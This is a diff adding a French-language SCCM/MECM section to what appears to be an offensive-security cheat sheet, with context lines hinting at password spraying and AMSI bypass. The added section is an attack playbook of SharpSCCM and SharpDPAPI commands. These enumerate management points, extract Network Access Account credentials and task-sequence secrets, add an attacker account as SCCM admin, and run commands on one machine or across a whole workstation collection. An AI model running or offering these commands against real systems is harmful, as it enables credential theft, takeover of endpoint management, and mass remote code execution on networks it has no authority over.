@@ -397,6 +397,51 @@ trevorspray -u users.txt -p passwords.txt
 
 ---
 
+## SCCM / MECM
+
+### Énumération
+
+```powershell
+# Identifier les serveurs SCCM
+nslookup -type=srv _mssms_mp_.yourcompany.local
+
+# Info depuis un client SCCM
+.\SharpSCCM.exe local site-info
+.\SharpSCCM.exe local client-info
+
+# Lister composants
+.\SharpSCCM.exe get management-points
+.\SharpSCCM.exe get distribution-points
+.\SharpSCCM.exe get collections
+```
+
+### Extraction Credentials
+
+```powershell
+# Network Access Account (NAA)
+.\SharpSCCM.exe local naa
+.\SharpDPAPI.exe sccm
+
+# Task Sequence secrets
+.\SharpSCCM.exe get task-sequences
+.\SharpSCCM.exe get secrets
+```
+
+### Exploitation
+
+```powershell
+# Ajouter admin SCCM
+.\SharpSCCM.exe admin add-admin --user DOMAIN\attacker --scope "All Systems"
+
+# Exécuter commande sur une machine
+.\SharpSCCM.exe exec -d TARGET-PC -p "cmd.exe" -a "/c whoami"
+
+# Déployer sur collection entière
+.\SharpSCCM.exe exec -d ALL-WORKSTATIONS -p "powershell.exe" -r
+```
+
+---
+
 ## Defense Evasion
 
 ### AMSI Bypass
